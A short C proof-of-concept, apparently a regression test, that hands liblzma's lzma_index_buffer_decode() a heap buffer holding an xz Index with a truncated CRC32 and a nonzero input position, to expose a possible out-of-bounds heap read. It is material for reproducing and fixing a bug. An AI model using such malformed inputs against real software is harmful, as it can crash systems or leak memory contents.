// PoC: lzma_index_buffer_decode() with *in_pos > 0 and an Index that
// ends exactly at the end of the input buffer (CRC32 truncated).
//
// The Index starts at offset 12 (e.g. right after a Stream Header).
// A correct decoder stops at the end of the 18-byte buffer and reports
// LZMA_DATA_ERROR. If the decoder is handed the full buffer size together
// with a pointer advanced past the 12-byte prefix, it reads past the end
// of the heap allocation while checking the Index CRC32.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <lzma.h>

int
main(void)
{
	// 12-byte prefix followed by an Index missing its last two
	// CRC32 bytes.
	const size_t prefix = 12;
	const size_t in_size = 18;
	uint8_t *in = malloc(in_size);
	if (in == NULL)
		return 77;

	// Prefix contents don't matter to the Index decoder.
	memset(in, 0xFD, prefix);

	// Index Indicator: 0x00
	in[prefix + 0] = 0x00;
	// Number of Records: 0
	in[prefix + 1] = 0x00;
	// Index Padding: two 0x00 bytes to align to a multiple of four.
	in[prefix + 2] = 0x00;
	in[prefix + 3] = 0x00;
	// Only the first two bytes of the CRC32 of the four bytes above
	// fit into the buffer.
	const uint32_t crc = lzma_crc32(in + prefix, 4, 0);
	in[prefix + 4] = (uint8_t)(crc);
	in[prefix + 5] = (uint8_t)(crc >> 8);

	lzma_index *i = NULL;
	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = prefix;

	const lzma_ret ret = lzma_index_buffer_decode(
			&i, &memlimit, NULL, in, &in_pos, in_size);

	fprintf(stderr, "lzma_index_buffer_decode() returned %d\n", (int)ret);

	lzma_index_end(i, NULL);
	free(in);
	return 0;
}
